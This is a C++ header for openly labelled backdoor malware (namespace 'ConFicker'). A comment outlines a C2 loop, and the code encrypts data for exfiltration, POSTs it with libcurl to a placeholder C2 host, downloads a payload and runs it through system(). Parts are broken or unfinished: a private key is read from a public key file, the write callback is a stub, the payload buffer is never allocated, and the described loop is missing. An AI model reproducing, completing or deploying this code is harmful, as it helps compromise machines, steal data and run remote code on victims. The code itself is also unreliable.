#ifndef BACKDOOR_HPP
#define BACKDOOR_HPP

/**
 * @brief Pseudo code for the backdoor
 * START
 * 1. Check if the keyboard layout is US
 * 2. download host external IP
 * 3. Scan check the C2 server
 * 4. If the C2 server is up, download the payload
 * 5. If the C2 server is down, sleep for 5 minutes
 * 6. Once the payload is downloaded, execute it and sleep for 5 minutes
 * 7. Repeat steps 3-6 until the C2 server is up 
 */

#include <iostream>
#include <stdlib.h>
#include <filesystem>
//? Check if the system is Windows or Linux
#include "OSCheck.hpp"
#if defined(_WIN32)
    #include "windows.h"
    #include "winuser.h"
    #include "winsock2.h"
    #include <libcurl/curl.h>
#endif
#include <unistd.h>
#include <curl/curl.h>
#include "CkRsa.h"
#include "CkCrypt2.h"
#include "KBCheck.hpp"

namespace ConFicker
{
    class Backdoor
    {
        public:
        void RsaEncrypt(const char* toExfil = "the content to encrypt") {
            CkRsa rsa;
            CkCrypt2 crypt;

            const char* privKey = rsa.snkToXml("rsa_public.snk");
            bool success = rsa.ImportPrivateKey(privKey);

            crypt.put_CryptAlgorithm("rsa");
            crypt.put_CipherMode("pkcs1");
            crypt.put_KeyLength(4096);

            const char* decKey = crypt.genEncodedSecretKey("secret", "hex");

            crypt.SetEncodedKey(decKey, "hex");
            rsa.put_EncodingMode("hex");

            bool bUsePrivateKey = false;
            const char* encKey = rsa.encryptStringENC("secret", bUsePrivateKey);

            crypt.put_EncodingMode("base64");
            const char* encText = crypt.encryptStringENC(toExfil);

            // send the encrypted key and encrypted text to the server
            this->SendToC2(encText);
        }

        void SendToC2(const char* data) {
            CURL* curl;
            CURLcode res;

            curl = curl_easy_init();
            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, "https://example.com");
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
                res = curl_easy_perform(curl);
                curl_easy_cleanup(curl);

                if (res != CURLE_OK) {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                } else {
                    // now we download the payload
                    this->DownloadPayload();
                }
         }
        }

        void DownloadPayload(void) {
            CURL* curl;
            CURLcode res;

            curl = curl_easy_init();
            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, "https://example.com");
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallBack());
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &payload);
                res = curl_easy_perform(curl);
                curl_easy_cleanup(curl);

                if (res != CURLE_OK) {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                } else {
                    // now we execute the payload
                    this->ExecutePayload();
                }
            }
        }

        void ExecutePayload() {
            // execute the payload
            system(payload);
        }

        private:
        char* payload;
        auto WriteCallBack(void)
        {
            return 0;
        }
    };
};

#endif // BACKDOOR_HPP